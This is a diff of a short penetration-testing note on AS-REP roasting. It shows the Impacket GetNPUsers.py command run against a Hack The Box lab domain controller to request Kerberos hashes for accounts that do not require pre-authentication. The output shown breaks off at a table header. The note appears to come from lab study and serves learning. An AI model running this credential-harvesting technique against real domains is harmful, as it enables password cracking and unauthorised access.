@@ -1,11 +1,11 @@
 ---
 publish: true
 created: 2026-01-24T16:14:55.893+05:30
-modified: 2026-06-21T19:52:26.268+05:30
+modified: 2026-06-23T12:05:31.212+05:30
 ---
 
 You could perform this request _without having any valid account_ credentials on target machine.
-Requirement - _UF\_DONT\_REQUIRE\_PREAUTH_ has to set.
+**Requirement**: _UF\_DONT\_REQUIRE\_PREAUTH_ has to be set.
 
 # user unknown
 
@@ -15,7 +15,6 @@ Requirement - _UF\_DONT\_REQUIRE\_PREAUTH_ has to set.
 # htb.local is the domain, not machine name.
 $ GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/
 
-/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
 Name          MemberOf                                                PasswordLastSet      LastLogon            UAC
